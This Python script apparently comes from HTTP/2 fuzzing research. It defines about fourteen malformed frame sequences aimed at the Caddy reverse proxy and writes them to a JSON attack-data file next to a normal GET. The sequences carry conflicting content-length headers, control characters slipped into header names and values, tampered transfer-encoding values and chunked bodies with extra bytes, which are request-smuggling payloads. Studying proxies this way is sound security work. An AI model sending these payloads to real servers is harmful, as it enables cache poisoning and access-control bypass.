import json

# normal GET
get_frm = {
    "<headers-frame-base-2:1>": {":method": "GET", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": ["EH", "ES"]}}

# content-length incomplete without body
req_554 = {"<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "20", "flags": ["EH"]},
            "<headers-frame-pool-1:2>": {":method": "POST\u001d", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "\bcontent-length": "10", "flags": ["EH"]},
            "<headers-frame-base-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": ["EH"]},
            "<data-frame-base-2:1>": {"data": "0\r\n\r\n", "flags": []}, "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}


req_755 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-pool-1:1>": {"content-length": "10", "flags": ["EH"]}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
           "<priority-headers-frame-pool-1:1>": {":method": "GET)", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "$content-length": "5", "flags": ["ES", "EH", "+"], "exclusive": "1", "dependency": "3", "weight": "100"}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}

req_924 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-pool-1:1>": {"content-length": "20", "flags": []}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "\fcontent-length": "10", "flags": []}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}

req_982 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []}, 
           "<continuation-frame-pool-1:1>": {"content-length:": "5", "flags": ["EH"]}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<data-frame-base-2:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": []}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}

req_256 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-pool-1:1>": {"content-length": "15", "flags": ["EH"]}, 
           "<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "\b\u000e10", "flags": ["EH"]}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}

req_392 = {"<headers-frame-pool-1:1>": {":method": "GET", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "20", "flags": ["EH"]}, 
           "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<continuation-frame-pool-1:1>": {"transfer-encoding": "chunked\u007f", "flags": []}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n", "flags": ["ES"]}}

req_854 = {"<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "10", "flags": ["EH"]}, 
           "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<continuation-frame-pool-1:1>": {"transfer-encoding": "identity~", "flags": ["EH"]}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}

req_150 =  {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
            "<continuation-frame-pool-1:2>": {"content-length_": "5", "flags": []}, 
            "<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []}, 
            "<continuation-frame-pool-1:1>": {"content-length": "20", "flags": ["EH"]}, 
            "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
            "<data-frame-base-2:1>": {"data": "0\r\n\r\n", "flags": []}, 
            "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n", "flags": ["ES"]}}


req_637= {"<headers-frame-pool-1:1>": {":method": "#TRACE", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "10", "flags": ["EH"]}, 
          "<headers-frame-pool-1:2>": {":method": "GET", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "5", "flags": ["ES", "EH"]}, 
          "<headers-frame-base-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": ["EH"]},
          "<data-frame-base-2:1>": {"data": "0\r\n\r\n", "flags": []}, "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n", "flags": ["ES"]}}

req_887 = {"<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "15", "flags": ["EH"]}, 
           "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []},
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<headers-frame-pool-1:2>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length)": "10", "flags": []}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n", "flags": ["ES"]}}

req_963 = {"<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "20", "flags": ["EH"]}, 
           "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []},
           "<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []}, 
            "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
            "<continuation-frame-pool-1:1>": {":method": "POST", "content-length": "&10", "flags": ["EH"]},
            "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}

req_61 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []},
        "<continuation-frame-pool-1:1>": {"content-length": "5", "flags": []}, 
        "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
        "<headers-frame-pool-1:1>": {":method": "_POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length": "10\u001b", "flags": ["ES"]}, 
        "<data-frame-base-2:1>": {"data": "0\r\n\r\n", "flags": []}, 
        "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}

req_144 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
           "<continuation-frame-pool-1:1>": {"content-length": "10", "flags": []}, 
           "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
           "<headers-frame-pool-1:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "content-length\u0000": "\u00195", "flags": ["ES"]}, 
           "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}

req_537 =  {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1", "flags": []}, 
            "<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []}, 
            "<continuation-frame-pool-1:2>": {"content-length": "15", "flags": ["EH"]}, 
            "<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]}, 
            "<continuation-frame-pool-1:1>": {"content-length": "15)", "flags": []}, 
            "<data-frame-base-2:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": []}, 
            "<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}



caddy_anomaly_req_id = ["req_256", "req_392", "req_854", "req_150",  "req_637", "req_887", "req_963", "req_61", "req_144", "req_537", "req_554", "req_755","req_924", "req_982"]
caddy_anomaly_req = [req_256, req_392, req_854, req_150, req_637, req_887, req_963, req_61, req_144, req_537, req_554, req_755,req_924, req_982]

def save_attack_data(reverse_proxy):
    if reverse_proxy == "caddy":
        anamaly_names = caddy_anomaly_req_id
        anamaly_frames = caddy_anomaly_req
    tmp_dict = {}
    for i in range(len(anamaly_names)):
        tmp_dict[anamaly_names[i]] = anamaly_frames[i]
    file_name = str(reverse_proxy) + '_attack_data.json'
    with open(file_name, 'w') as f:
        json_str = json.dumps(tmp_dict, indent=0)
        f.write(json_str)
        f.write('\n')

def save_get_request():
    normal_get = {}
    normal_get["get_frm"] = get_frm
    with open('./normal_get_data.json', 'w') as f:
        json_str = json.dumps(normal_get, indent=0)
        f.write(json_str)
        f.write('\n')

if __name__ == "__main__":
    # 将生成异常帧的json
    save_attack_data('caddy')
    save_get_request()